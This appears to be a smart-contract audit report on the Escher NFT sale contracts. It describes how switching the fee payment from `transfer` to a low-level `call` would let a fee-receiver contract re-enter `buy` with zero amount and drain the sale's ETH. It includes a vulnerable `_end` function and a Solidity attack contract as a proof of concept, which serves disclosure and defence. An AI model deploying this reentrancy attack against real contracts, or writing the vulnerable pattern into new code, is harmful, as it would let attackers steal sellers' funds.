# Vulnerability details

## Impact

The author's sale can be stolen by fee receiver when re-entrancy happens.

## Proof of Concept

In the current implemetation in FixedPrice.sol, OpenEdition.sol and LPDA.sol,

after the auction is completed, 5% of the fee is sent to the fee receiver sent in the FixedPriceFactory.sol / OpenEditionFactory.sol and LPDAFactory.sol

Let us use FixedPriceFactory.sol and FixedPrice.sol as an example (the OpenEdition.sol and LPDA.sol has the same issue.)

```solidity
contract FixedPriceFactory is Ownable {
    using Clones for address;

    address payable public feeReceiver;
```

and the feeReceiver can be set in the constructor

```solidity
constructor() Ownable() {
	implementation = address(new FixedPrice());
	feeReceiver = payable(msg.sender);
}
```

or via the privileged function:

```solidity
/// @notice set the fee receiver for fixed price editions
/// @param fees the address to receive fees
function setFeeReceiver(address payable fees) public onlyOwner {
	feeReceiver = fees;
}
```

then after the auction is completed, this function is called

```solidity
function buy(uint256 _amount) external payable {
	Sale memory sale_ = sale;
	IEscher721 nft = IEscher721(sale_.edition);
	require(block.timestamp >= sale_.startTime, "TOO SOON");
	require(_amount * sale_.price == msg.value, "WRONG PRICE");
	uint48 newId = uint48(_amount) + sale_.currentId;
	require(newId <= sale_.finalId, "TOO MANY");

	for (uint48 x = sale_.currentId + 1; x <= newId; x++) {
		nft.mint(msg.sender, x);
	}

	sale.currentId = newId;

	emit Buy(msg.sender, _amount, msg.value, sale);

	if (newId == sale_.finalId) _end(sale);
}
```

note the codes:

```solidity
sale.currentId = newId;

emit Buy(msg.sender, _amount, msg.value, sale);

if (newId == sale_.finalId) _end(sale);
```

if all item sold out, _end is called, the _end function forward 5% of the sale fee to the fee receiver and the forwardt the rest of the fee to the author (saler) and selfdestruct the contract.

```solidity
/// @notice Owner can cancel current sale
/// @param _sale the sale info
function _end(Sale memory _sale) internal {
	emit End(_sale);
	ISaleFactory(factory).feeReceiver().transfer(address(this).balance / 20);
	selfdestruct(_sale.saleReceiver);
}
```

While, in another report, I wrote:

https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/

transfer use a hardcoded gas limit 2300, but the gas cost can and will change and can break the contract.

I am sure there are a lot of warden report this issue and make recommendation:

```solidity
(bool sent,memory data) = _to.call{value: msg.value}("") 
```

Now assume that the project imiplements this changes, a big big reentrancy issue is introduced.

If we look into the function _end again:

```solidity
function _end(Sale memory _sale) internal {
	emit End(_sale);
	ISaleFactory(factory).feeReceiver().transfer(address(this).balance / 20);
	selfdestruct(_sale.saleReceiver);
}
```

We are forwarding ETH first to the feeReceiver then withdraw the rest of the ETH for the saler, if the _to.call is used and the feeReceiver is a smart contract that can re-enter the function buy the charge the sale fee again and again to drain the ETH in the contract before selfdestruct(_sale.saleReceiver) is called.

Using payable(address).transfer does not has this re-entrancy issue because the 2300 gas limit makes the re-entrancy run out of gas, but if the project changes to _to.call, this issue is definitely worth noting.

A coded POC can be implemented below:

In FixedPrice.sol, we commented out the _end that use .transfer and we use .to to send ETH.

https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/src/minters/FixedPrice.sol#L104

```solidity
/// @notice Owner can cancel current sale
/// @param _sale the sale info

// function _end(Sale memory _sale) internal {
//     emit End(_sale);
//     ISaleFactory(factory).feeReceiver().transfer(address(this).balance / 20);
//     selfdestruct(_sale.saleReceiver);
// }

function _end(Sale memory _sale) internal {
	emit End(_sale);

	uint256 fee = address(this).balance / 20;

	(bool sent, ) = ISaleFactory(factory).feeReceiver().call{value: fee}("");
	require(sent, "failed to send fee");

	selfdestruct(_sale.saleReceiver);
}
```

Then we add this smart contract for reentrancy in src/minters folder.

there is another important factor for this reentrancy: how to re-enter the call?

the code reenters the call with buy amount 0 and 0 ETH to bypass this line:

if amount is 0, msg.value is 0, the line will pass.

```solidity
require(_amount * sale_.price == msg.value, "WRONG PRICE");
```


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Test.sol";

interface IFixedPrice {
    function buy(uint256 _amount) external payable;
}

contract ReentrantReceiver {

    IFixedPrice internal addr;
    bool internal state;

    constructor(address _fixedPriceAddr) {
        addr = IFixedPrice(_fixedPriceAddr);
    }

    receive() external payable {
        if(!state) {
            state = true;
            addr.buy{value: 0}(0);
            console.log("reentrancy triggered");
        }
    }

}
```

We need to add the import:

https://github.com/code-423n4/2022-12-escher/blob/5d8be6aa0e8634fdb2f328b99076b0d05fefab73/test/FixedPrice.t.sol#L7

```solidity
import "forge-std/console.sol";
import { ReentrantReceiver } from "src/minters/ReentrantReceiver.sol";
```

